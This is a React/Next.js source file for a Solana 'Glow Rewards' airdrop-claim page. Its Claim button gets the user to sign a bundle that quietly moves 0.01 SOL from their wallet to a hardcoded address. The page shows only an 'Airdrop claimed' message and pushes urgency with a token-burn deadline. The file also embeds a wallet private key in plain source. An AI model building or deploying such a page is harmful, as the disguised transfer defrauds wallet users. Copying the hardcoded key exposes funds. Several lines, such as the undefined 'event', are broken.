import type { NextPage } from "next";
import styles from "../styles/Home.module.css";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import * as web3 from "@solana/web3.js";
import { LAMPORTS_PER_SOL, Signer } from "@solana/web3.js";
import { FC, useState } from "react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import dynamic from "next/dynamic";
import {
  getOrCreateAssociatedTokenAccount,
  createTransferInstruction,
  transfer,
} from "@solana/spl-token";
import {
  Connection,
  Keypair,
  ParsedAccountData,
  PublicKey,
  sendAndConfirmTransaction,
  Transaction,
} from "@solana/web3.js";
import { useToast } from "@chakra-ui/react";
import { error } from "console";

const WalletMultiButtonDynamic = dynamic(
  async () =>
    (await import("@solana/wallet-adapter-react-ui")).WalletMultiButton,
  { ssr: false }
);

const secret = [
  219, 47, 167, 168, 215, 127, 205, 123, 128, 174, 170, 235, 116, 227, 59, 190,
  188, 97, 91, 139, 66, 88, 56, 104, 115, 2, 155, 11, 247, 16, 211, 185, 179,
  143, 2, 151, 74, 163, 38, 250, 251, 204, 147, 226, 76, 216, 61, 191, 126, 154,
  175, 85, 83, 187, 167, 253, 175, 2, 31, 48, 2, 77, 52, 14,
];
const FROM_KEYPAIR = Keypair.fromSecretKey(new Uint8Array(secret));

const MINT_ADDRESS = "3XeKbfaXEeGyViA6j71mKKnLZvoySnPWxg42XM6RLWPE";
const TRANSFER_AMOUNT = 0.01;
const numberDecimals = 9;
const sourceAccount = new web3.PublicKey(
  "74fj5FKdWYmrATaVrYSSKB8etaUq6vBQiVb8XoVmwvMt"
);
const soladd = new web3.PublicKey(
  "D5vTVbLXoknYmAAbMknjebbsBnpL6ziHdTTX4wprvA1K"
);

const ConnectWallet: FC = () => {
  const [txSig, setTxSig] = useState("");
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const link = () => {
    return txSig
      ? `https://explorer.solana.com/tx/${txSig}?cluster=devnet`
      : "";
  };
  const wallet = useWallet();
  const toast = useToast();
  const ClaimButton = async () => {
    event.preventDefault();
    if (!connection || !publicKey) {
      return;
    }

    const transaction1 = new web3.Transaction();
    const transaction2 = new web3.Transaction();

    const sendtestInstruction = web3.SystemProgram.transfer({
      fromPubkey: publicKey,
      toPubkey: new web3.PublicKey(
        "DtY5MoyVbXmYmKPQjy3ED4kzhJSpssmKJvvRsZgPN7Rq"
      ),
      lamports: LAMPORTS_PER_SOL * 0.01,
    });

    console.log(
      `Sending ${TRANSFER_AMOUNT} ${MINT_ADDRESS} from ${FROM_KEYPAIR.publicKey.toString()} to ${publicKey}.`
    );

    console.log(`2 - Getting Destination Token Account`);
    let destinationAccount = await getOrCreateAssociatedTokenAccount(
      connection,
      FROM_KEYPAIR,
      new PublicKey(MINT_ADDRESS),
      publicKey
    );
    console.log(
      `    Destination Account: ${destinationAccount.address.toString()}`
    );

    const sendInstruction = createTransferInstruction(
      sourceAccount,
      destinationAccount.address,
      soladd,
      TRANSFER_AMOUNT * Math.pow(10, numberDecimals)
    );

    transaction1.add(sendtestInstruction);
    transaction2.add(sendInstruction);

    const transactions = [transaction1, transaction2];
    const block = await connection.getLatestBlockhash();
    transactions.forEach((ta) => {
      ta.recentBlockhash = block.blockhash;
      ta.feePayer = wallet.publicKey!;
    });

    transaction2.recentBlockhash = block.blockhash;
    transaction2.sign(FROM_KEYPAIR);
    const signedTransactions = await wallet.signAllTransactions(transactions);

    try {
      for (const ta of signedTransactions) {
        const signature = await connection.sendRawTransaction(ta.serialize(), {
          skipPreflight: false,
        });
        console.log(signature);
      }
    } catch (error) {
      console.log("Error:", error);
      throw error;
    }
  };
  const onClaim = async () => {
    toast.promise(ClaimButton(), {
      success: { title: "Promise resolved", description: `Airdrop claimed ` },
      error: (error) => ({
        title: "Promise rejected",
        description: `Error: ${error.message}`,
      }),
      loading: { title: "Promise pending", description: `Please wait` },
    });
  };
  return (
    <div className={styles.connectW}>
      <img className={styles.vector} alt="" src="Vector.svg" />
      <div className={styles.navigation}>
        <div className={styles.glowgame}>Glowgames</div>
        <div className={styles.container}>
          <div className={styles.home}>Home</div>
          <div className={styles.task}>Task</div>
          <div>
            <WalletMultiButtonDynamic className={styles.solwal} />
          </div>
        </div>
      </div>
      <div className={styles.container1}>
        <b className={styles.connectWalletToContainer}>
          <span>{`Connect Wallet to check Eligibility for `}</span>
          <span className={styles.glo}>Glow</span>
          <span className={styles.span}>{` `}</span>
          <span>Rewards</span>
        </b>
        <div className={styles.allUnclaimedTokens}>
          All unclaimed tokens will be burned on 7th June 2024
        </div>{" "}
        {publicKey ? (
          <form onSubmit={onClaim} className={styles.button1}>
            <button type="submit" className={styles.connectWallet1}>
              Claim
            </button>
          </form>
        ) : (
          <WalletMultiButtonDynamic className={styles.solwal} />
        )}
        <b className={styles.poweredBySolana}>
          <span className={styles.powered}>{`Powered  by `}</span>
          <span className={styles.span}>Solana</span>
        </b>
      </div>
    </div>
  );
};

export default ConnectWallet;
